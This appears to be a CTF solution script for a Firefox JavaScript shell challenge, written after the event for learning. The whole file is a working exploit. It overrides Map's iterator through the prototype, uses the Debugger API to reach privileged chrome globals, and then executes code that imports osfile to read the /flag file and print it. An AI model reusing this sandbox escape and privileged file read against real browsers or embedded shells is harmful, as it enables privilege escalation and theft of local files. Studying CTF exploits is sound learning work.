// firefox shell 2 - unsolved during ctf
// solved it myself after to learn


let a = new Map()
.debug

a.__proto__[Symbol.iterator] = function() {
    let z = new Debugger();
    z.addDebuggee(arguments.callee.caller.constructor('return globalThis')());
    let frame = z.getNewestFrame();
    let dbg = frame.environment.find("getPromiseDetails").getVariable("getPromiseDetails").environment.find("Debugger").getVariable("Debugger").unsafeDereference()
    let x = new dbg()
    x.findAllGlobals()[0].executeInGlobal(`
(async function () {
let osfile = ChromeUtils.import("resource://gre/modules/osfile/osfile_native.jsm");
let z = null;
await osfile.read("/flag").then((flag) => {z = flag});
let flag = "";
for(let char of z) flag += String.fromCharCode(char);
let co = ChromeUtils.import("resource:///modules/ConsoleObserver.jsm");
co.inspect(flag, false, globalThis);
})()
`)
}
a["a"] = 1
a


